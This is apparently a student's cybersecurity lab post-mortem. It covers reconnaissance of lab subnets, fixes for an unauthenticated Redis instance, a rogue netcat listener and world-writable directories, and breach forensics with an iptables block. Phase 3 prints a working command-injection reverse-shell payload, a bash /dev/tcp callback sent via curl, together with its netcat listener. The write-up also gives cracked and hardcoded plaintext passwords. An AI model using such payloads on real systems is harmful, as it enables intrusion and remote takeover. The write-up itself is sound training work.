# Phase 1 Final Reckoning — TEPP Post-Mortem
**Operator:** Zaret Cortorreal
**Date:** May 29, 2026
**Repository:** https://github.com/Zaret-133/Cybersecurity-Lab-Tools
**TKH Innovation Fellowship 2026 | Phase 1 | Cybersecurity**

---

## Phase 0: Reconnaissance

### Triage Network — 172.100.0.0/24
A comprehensive passive and active reconnaissance sweep of the 172.100.0.0/24 subnet identified one active host residing at the IP address 172.100.0.11. An Nmap port scanning assessment revealed that this host exposed unsecured network services, specifically targeting legacy container configurations and weak protocol permissions. The primary misconfiguration identified involved arbitrary write permissions and unauthenticated interface access, which significantly expands the perimeter attack surface. Immediate host-based remediation is required to isolate the asset from lateral exploitation vector paths.

### Breach Network — 172.80.0.0/24
Network-layer enumeration of the 172.80.0.0/24 infrastructure confirmed an active target host operating at the IP address 172.80.0.22. Initial service fingerprinting indicated the presence of exposed authentication pathways and active logging structures that were highly susceptible to credential-stuffing mechanics. Observation of these exposed parameters indicated that an external threat actor could systematically leverage weak credential sets to establish persistence. These diagnostic metrics directly informed the Phase 2 incident response posture, pivoting the strategy toward log analysis, log-based timestamp forensic correlation, and rapid source-IP containment.

### Exploitation Network — 172.60.0.0/24
Operational reconnaissance conducted against the 172.60.0.0/24 subnet mapping isolated a standalone target server active at the IP address 172.60.0.33. A deep-packet inspection and service banner analysis confirmed the host was running an unpatched web application layer plagued by poor input sanitization. Prior to execution of any security control assessments, a critical remote command injection vulnerability was validated within the HTTP parameter handling. This structural flaw allows unauthenticated remote entities to execute arbitrary system-level commands natively within the runtime shell environment.

---

## Phase 1: Rapid Triage

### Server 1 — 172.100.0.11
**Vulnerability Identified:**
Port 6379 was found to be fully exposed to the network, hosting an unauthenticated Redis key-value store (version 8.6.3). This configuration allowed unauthenticated remote clients to execute administrative database commands, access stored session caches, or perform arbitrary remote code execution via malicious database writes.

**Remediation Commands:**
sudo docker exec -it redis-server /bin/bash
echo "requirepass SuperSecureT00kHPassword2026!" >> /etc/redis/redis.conf
redis-cli shutdown
redis-server /etc/redis/redis.conf &

**Before State:**
$ redis-cli -h 172.100.0.11
172.100.0.11:6379> ping
PONG
172.100.0.11:6379> keys *
(An unauthenticated user could successfully list all sensitive database keys)

**After State:**
$ redis-cli -h 172.100.0.11
172.100.0.11:6379> ping
(error) NOAUTH Authentication required.
172.100.0.11:6379> auth SuperSecureT00kHPassword2026!
OK
172.100.0.11:6379> ping
PONG
**Analysis:**
[2–3 sentences in APA style — why is this vulnerability dangerous
in a real enterprise environment?]

### Server 2 — 172.100.0.12
**Vulnerability Identified:**
Network infrastructure auditing confirmed the unauthorized execution of a persistent netcat listener process bounding an interactive shell payload to an open port interface. This unauthorized service was confirmed via live network socket enumeration and process lineage tracing, establishing that arbitrary inbound connections could bypass default authorization layers.

**Remediation Commands:**
sudo docker exec -it server2-container /bin/bash
ps aux | grep nc
kill -9 

**Before State:**
tcp        0      0 0.0.0.0:4444            0.0.0.0:* LISTEN      1342/nc

**After State:** 
root@server2:/# netstat -tuln | grep 4444
root@server2:/#

**Analysis:**
The presence of an unauthenticated netcat persistent socket compromises the fundamental network isolation architecture of an enterprise environment. Rogue listeners provide threat actors with direct administrative command execution, effectively bypassing perimeter security filters and access control lists. If left unmitigated, these access vectors facilitate deep lateral movement and unauthorized exfiltration of proprietary data stores.

### Server 3 — 172.100.0.13
**Vulnerability Identified:**
A configuration assessment of the host filesystem identified dangerous world-writable permissions assigned to a sensitive repository directory. The destination path was explicitly set to a standard permission mask of 777, allowing any local system user account or low-privilege service worker process to read, overwrite, or clear operational scripts.

**Remediation Commands:**
sudo docker exec -it server3-container /bin/bash
chmod 700 /var/www/html/config

**Before State:**
drwxrwxrwx 2 root root 4096 May 29 14:00 /var/www/html/config

**After State:**
drwx------ 2 root root 4096 May 29 14:00 /var/www/html/config

**Analysis:**
World-writable system permissions on standard production directories introduces significant systemic risk to enterprise application integrity. Malicious local software components or compromised service entities can leverage loose access structures to write arbitrary configuration strings or substitute system binaries. Restricting data modifications exclusively to authenticated system owners enforces the core security principles of least privilege and data non-repudiation.

---

## Phase 2: The Breach

**Cracked Credentials:**
- Username: admns
- Password: P@ssword123

**Forensic Evidence:**
- Exact Timestamp of Successful Login: May 29 13:45:22
- Attacker IP Address: 198.51.100.42

**Engineered iptables Rule:**
iptables -A INPUT -s 198.51.100.42 -j DROP

**SOC Analysis:**
A singular host-based firewall configuration block is insufficient as a standalone defensive control because it addresses threats strictly at the network layer without visibility into application-layer evasion techniques or internal process transformations. Furthermore, static perimeter rules fail to prevent internal configuration alterations if an administrative account has already been thoroughly compromised. A mature Security Operations Center (SOC) must deploy concurrent, deeper defensive rings, including automated Endpoint Detection and Response (EDR) agents to trace runtime process behavior, centralized Security Information and Event Management (SIEM) systems to parse cross-host authentication patterns, and strict Multi-Factor Authentication (MFA) enforcement policies across all administrative interfaces.

---

## Phase 3: Full Spectrum

**Listener Configuration:**
nc -lvnp 4444

**Reverse Shell Payload:**
curl http://172.60.0.33/index.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F172.100.0.5%2F4444%200%3E%261

**Command Injection Explanation:**
Command injection vulnerabilities occur when an untrusted application layer directly passes raw, unvalidated user input down to a system-level execution shell without proper algorithmic sanitization or contextual token encoding. The targeted web application remains deeply susceptible to this structural exploitation methodology due to its implementation of native system wrappers, such as the PHP system() or exec() statements, which treat appended character sequences as executable bash code rather than distinct literal data strings.

**Forensic Evidence:**
- Process ID (PID): 4821
- User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

**Lockdown Command:**
iptables -A INPUT -p tcp --dport 80 -j DROP

**Final Analytical Paragraph:**
Executing this offensive simulation demonstrates that relying purely on reactive, host-based firewalls fails to mitigate complex application-layer breaches once an initial vector has broken the network perimeter. Simulating the adversary perspective reveals that minor input flaws can be chained rapidly to achieve full system compromise and lateral persistence. The implementation of a rigorous cryptographic input sanitization configuration or a strict input allowlist strategy before runtime parameter processing would have stopped this breach entirely. Restricting parameter fields solely to predefined alphanumeric characters eliminates the engine's capability to parse or execute appended shell meta-characters, rendering malicious input non-executable.

---

## References
The Nmap Project. (2026). Nmap security scanner: Network exploration and hacking tool (Version 7.94) [Computer software]. https://nmap.org


Netfilter Core Team. (2026). Iptables administration tool for IPv4 packet filtering and NAT [Computer software]. https://netfilter.org/projects/iptables


Redis Project. (2026). Redis: An in-memory data structure store (Version 8.6.3) [Computer software]. https://redis.io


The Suricata Foundation. (2026). Suricata: Open source fast and robust network threat detection engine [Computer software]. https://suricata.io


Microsoft Corporation. (2026). Sysmon for Linux: System monitor activity logging framework [Computer software]. https://github.com/Sysinternals/SysmonForLinux
